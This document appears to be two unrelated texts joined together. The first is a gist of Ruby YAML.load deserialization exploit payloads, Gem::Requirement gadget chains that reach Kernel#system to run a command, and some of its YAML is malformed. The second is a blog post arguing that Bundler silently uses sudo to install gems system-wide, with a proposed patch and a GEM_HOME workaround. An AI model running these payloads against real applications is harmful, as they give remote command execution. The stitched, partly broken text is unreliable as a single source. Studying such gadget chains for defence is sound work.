

Based on excellent write-up from https://www.elttam.com.au/blog/ruby-deserialization/

Doesn't work to use YAML.dump(payload) in the above script. This only produces the following YAML, which is worthless:

--- !ruby/object:Gem::Requirement
requirements:
- - ">="
  - !ruby/object:Gem::Version
    version: '0'

This is just a handcrafted conversion of the serialization done by Marshal.dump


Second version is based on the more recent and equally excellent writup from https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
ruby_yaml_load_sploit.yaml
```
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
ruby_yaml_load_sploit2.yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
         
 ```        



Fixing Ruby gems installation once and for all
AUGUST 25, 2022 / FELIPEC
Since the beginning the installation of Ruby gems has been broken: it is assumed the user wants to install gems in the system directory (e.g. /usr/lib/ruby/gems/3.0.0), which is virtually never the case.

For more than a decade different approaches to workaround this assumption have been tried, but they always cause one unexpected issue or another. The only approach that has not been tried is to actually fix this properly.

In my opinion the biggest hurdle to fixing this issue properly is the attitude of the Ruby community, where conflict is not just avoided, but actively denied. “Matz is nice and so we are nice” (MINASWAN) is a motto of the Ruby community which sounds great in theory, but in practice simply leads to many opinions being censored because they are “not nice”. Who is the arbiter of what is “nice”? Don’t you know there is no war in Ba Sing Se?

In my previous post I explained why this notion of being “nice” does not always work, and in response the Ruby community focused exclusively on me and my level of “niceness”, instead of listening to my argument. Not surprising in the least.

It’s because of the inability of the Ruby community (and others) to concentrate on the argument that in this blog post I’m not going to link to any of the heated discussions that have spawned for more than a decade, nor am I going to spice any of my comments (even if the level of insanity is begging for it).

I’m going to channel my inner zen robot and just concentrate on the technical aspect, and only the technical aspect (after this colorful introduction of course). Hopefully this time people will focus on the actual patch.

bundle install
Let’s start with a simple ruby gem. We create a Gemfile where we specify our dependencies:

source 'https://rubygems.org'
gem 'rake'
gem 'inifile'
And then install the dependencies:

❯ bundle install
Fetching gem metadata from https://rubygems.org/.
Resolving dependencies...
Using rake 13.0.6
Following files may not be writable, so sudo is needed:
  /usr/bin
  /usr/lib/ruby/gems/3.0.0
  /usr/lib/ruby/gems/3.0.0/build_info
  /usr/lib/ruby/gems/3.0.0/cache
  /usr/lib/ruby/gems/3.0.0/doc
  /usr/lib/ruby/gems/3.0.0/extensions
  /usr/lib/ruby/gems/3.0.0/gems
  /usr/lib/ruby/gems/3.0.0/plugins
  /usr/lib/ruby/gems/3.0.0/specifications
Using bundler 2.3.19
Fetching inifile 3.0.0
Installing inifile 3.0.0
Bundle complete! 2 Gemfile dependencies, 3 gems now installed.
Use `bundle info [gemname]` to see where a bundled gem is installed.
Have you spotted the problem? Ruby’s bundle command just installed a bunch of files into the system directory (/usr/lib/ruby), using sudo, and without asking me first.

Advertisements

REPORT THIS AD

I am going to resist the urge to add an adjective to qualify the practice of using sudo behind the scenes to install something into the system that is not just user-specific, but gem-specific. Let’s just say it’s probably not what the user wanted.

Some of you may be thinking this is surely something related to my system or perhaps my distribution, surely Ruby wouldn’t be doing that by default. Nope, this is a universal problem. I could link to countless bug reports, blog posts, or Stack Overflow questions, but that might hurt the sensibilities of Ruby maintainers. Instead, I’m going add a link to the installation instructions of one of the most popular Ruby gems: Jekyll installation instructions for Ubuntu:

Avoid installing RubyGems packages (called gems) as the root user.

So my distribution is Arch Linux, and the official installation instructions for Jekyll on Ubuntu do mention the same problem, and the workaround is the same: set GEM_HOME. I’m pretty sure the official workaround for this problem in Arch Linux is also setting GEM_HOME, because I was the one who wrote those instructions. Again, I could link to the fierce debates with Arch Linux maintainers, but that might hurt the sensibilities of Ruby maintainers, so I’m not going to do that.

This is a problem with rubygems itself, specifically the bundle command, and if you don’t believe that, copy the Gemfile above and figure out what bundle install does on your system. If I were you I would do that on a user who does not have sudo permissions though.

Dissecting bundle install
OK, so we have a working theory that bundle install does call sudo, how can we make sure? A simple stack trace shows this:

# SUDO HAX
if requires_sudo?
  ...
end
Note that I’m not the one calling this a “SUDO HAX”, this is the official comment that is in the actual code of lib/bundler/source/rubygems.rb, go check by youself.

Could this be a corner case? Actually the requires_sudo? method is built right into the Bundler class, and it’s even part of the official documentation, so it’s probably meant to be called.

If that wasn’t enough, the bundle install man page says the following:

Sudo Usage
By default, Bundler installs gems to the same location as gem install.

In some cases, that location may not be writable by your Unix user. In that case, Bundler will stage everything in a temporary directory, then ask you for your sudo password in order to copy the gems into their system location.

From your perspective, this is identical to installing the gems directly into the system.

Advertisements

REPORT THIS AD

At this point there shouldn’t be a shadow of a doubt: bundle install does intend to install gems into system directories using sudo, by default. However, it should do so only when ruby gem is configured that way. So the problem isn’t bundle, the problem is gem, so if we install the gem directly we get:

❯ gem install inifile
Successfully installed inifile-3.0.0
Parsing documentation for inifile-3.0.0
Installing ri documentation for inifile-3.0.0
Done installing documentation for inifile after 0 seconds
1 gem installed
Why didn’t gem install require sudo?

❯ gem info inifile

*** LOCAL GEMS ***

inifile (3.0.0)
    Author: Tim Pease
    Homepage: http://rubygems.org/gems/inifile
    Installed at: /home/felipec/.local/share/gem/ruby/3.0.0

    INI file reader and writer
Are you starting to feel the frustration? Sorry, there’s no frustration, this is normal software behavior. There is no war in Ba Sing Se. Right.

OK, so bundle install installed the gems in /usr/lib/ruby/gems/3.0.0, but gem install installed them in ~/.local/share/gem/ruby/3.0.0, but the man page said bundler install installed the gems in the same location as gem install, therefore if there’s any discrepancy, people would have reported that issue, and they did, in… No, I cannot provide the links to those reports, because they are not “nice”. OK, even if the reports are not “nice”, the discrepancy is still there, so surely the maintainers would have taken care of it… Except they didn’t.

Also, the man page says I should be asked for a password, but I never was.

The discrepancy
I’m going to save you all the trouble of figuring out what’s different from bundle install to gem install, but essentially it boils down to a configuration called gemrc. There’s a user configuration, but there’s also a system configuration, and in the case of Arch Linux there’s a file called /etc/gemrc which contains the following:

gem: --user-install
This means that when you call “gem install inifile“, you are actually calling “gem install --user-install inifile“. This solves everything doesn’t it? Because every time you want to install a gem it will be installed in the user directory instead of the system directory… Yes… But only when you do gem install, not when you do bundle install.

What possible reason could there be to implement something for ruby gem, but not ruby bundle? (especially when they are part of the same project) Well, the reason is that for a long time bundle was a different project from gem, sure: bundle used gem, but it had different maintainers, different packages, different bug report system, etc. So when ruby gem implemented --user-install, it worked great for gem, and it didn’t work at all for bundle.

Advertisements

REPORT THIS AD

So Arch Linux’s /etc/gemrc ensures --user-install is passed to gem install, but bundle install doesn’t call gem install, so that configuration is completely ignored.

When the man page of bundle install says that it’s using the same location as gem install, that’s a lie something that isn’t true, and the developers know isn’t true. It’s the same location only if /etc/gemrc (or ~/.gemrc) doesn’t specify a different location, or in other words: only if the location is the default location.

Regardless of what you (or anyone) may think, the fact of the matter is that /etc/gemrc does not affect bundle install, and there’s no clear standard way to say “please don’t use sudo to install gems”. The only way is very convoluted and will require jumping through many layers.

If you want to check how much care was put into this sudo “feature”, check the initial patch: First pass at getting bundler to play well when $GEM_HOME is owned by root.

Show me the code
One motto of Linus Torvalds is “talk is cheap. show me the code.” and I agree. It does not matter how many hours you have spent discussing or analyzing the code, at the end of the day you have to provide at least a tentative fix, or your opinions aren’t worth much. So is there a way we could cut through all the bullshit get to the point and solve the problem?

The answer is: yes.

The location bundle uses to install gems is specified in Bundler::RubygemsIntegration.gem_dir, which is in bundler/lib/bundler/rubygems_integration.rb. Right now it’s simply returning Gem.dir, which is a system directory. We could change it to return the user directory Gem.user_dir, but we don’t want to do this invariably, we want to do this only when --user-install is configured.

Great, so all we need is a condition, and we can check how gem install is checking for --user-install, and simply do that.

That is being done in Gem::Installer.initialize in lib/rubygems/installer.rb by checking options[:user_install], but where do those options come from? Turns out every ruby gems command uses a Gem::GemRunner utility which runs the command, and fetches the configuration with Gem.configuration[command_name] (in this case “gem“)… But bundle doesn’t use GemRunner, so this configuration isn’t available anywhere. We could do the same thing the runner is doing and fetch the configuration manually with Gem.configuration[:gem], but that returns a string, which still needs to be parsed.

In the interest of preserving your sanity, this is the result:

def gem_dir
  user_install = Gem.configuration[:gem]&.split(' ')&.include?('--user-install')
  user_install ? Gem.user_dir : Gem.dir
end
This works perfectly. If the user or the distribution has configured gem with --user-install, then bundle will also install to the user directory by default.

So we are done…

Not so fast. The objective is not to add yet another hack, it’s to fix this properly once and for all. Is that even possible at this point? Let’s try.

Rethinking the whole enchilada
If we go through all the mazes of different layers of different projects we arrive to the core of the core of the issue in Gem::PathSupport.initialize in lib/rubygems/path_support.rb, in particular:

@home = env["GEM_HOME"] || Gem.default_dir
Advertisements

REPORT THIS AD

Gem.paths.home is where gems are actually installed to, and it can be overridden by setting the environment variable GEM_HOME (remember all the instructions recommending that?), but if that isn’t set, then Gem.default_dir is used. Gem.default_dir is rubylibprefix (/usr/lib/ruby) + “gems” + ruby_version (3.0.0): /usr/lib/ruby/gems/3.0.0, so it’s a system directory.

There’s another directory called Gem.user_dir (e.g. ~/.local/share/gem/ruby/3.0.0), and there’s another called Gem.dir, which is a shortcut for Gem.paths.home.

So what we need is to get rid of the assumption that gems should be installed by default in the system directory, Gem.default_dir is the default in the sense that that’s where the default gems are initially installed to, but not where gems should be installed to by default. The default should be Gem.user_dir, unless the user or the distribution have explicitly specified otherwise.

We could simply change Gem.default_dir to Gem.user_dir, and that would actually work, but it would be a backwards incompatible change that could break a lot of things.

One option is adding yet another variable Gem.default_install which points to the true location where gems should be installed by default. Initially it would be default_dir–in order to not break backwards compatibility–but distributions could override this in the operating_system.rb file (which is meant for that: override the defaults) and set it to user_dir. Then all gems both in gem and bundle would be installed in the user directory, but only on distributions which specifically configured so.

@home = env["GEM_HOME"] || Gem.default_install
Is that it? Have we actually solved decades of issues in 1 line of code? Yeap.

The patch is rather simple: Add Gem.default_install.

Update: initially I proposed Gem.user_install, but now I think Gem.default_install is better.

Why haven’t rubygems developers picked this patch? Or even discussed it? Because I dared to say so far there was “no satisfactory resolution from the development team” something that wasn’t “top nice”, so I was permanently banned from the project.

In the process of implementing and testing this properly I found many issues, for example if you do “gem uninstall --user-install” it will attempt to uninstall all versions, even those which are not in the user_dir, even though you explicitly specified --user-install. The result of all these fixes is 15 patches: fc/user-install.

I’m sorry, strike that, there is no war in Ba Sing Se, and there are no major problems in rubygems. My bad.

What to do?
There is nothing to do. The rubygems developers are not interested in my clean solution because I said something that wasn’t “nice”, and that’s that.

If you want to fix this for yourself, do this:

# bundle doesn't know where to install gems otherwise
export GEM_HOME=$(ruby -e 'puts Gem.user_dir')
Advertisements

REPORT THIS AD

This does exactly the same as my patch: set Gem.paths.home to Gem.user_dir, and therefore Gem.dir as well. This is something Linux distributions should be doing by default, but rubygems doesn’t make it easy for them.

Anyway I’m not going to leave you without a dose of drama. For all the discussions check the addendum to this post: Ruby: for the love of god, stop using sudo. Would people leave juicy comments after realizing a minor command which was supposed to install dependencies of a gem called sudo behind their back and modified system directories? Even when gem itself was configured to not do that. What do you think?

Update: After this post (5 days later) the maintainers of RubyGems decided to completely remove the sudo feature of bundler for some mysterious reason. In my opinion they shouldn’t remove features this way and will likely cause problems for some users. They only discussed this for 2 days before pulling the plug: Completely remove “auto-sudo” feature. It still doesn’t solve the root of the problem, but at least they did something.
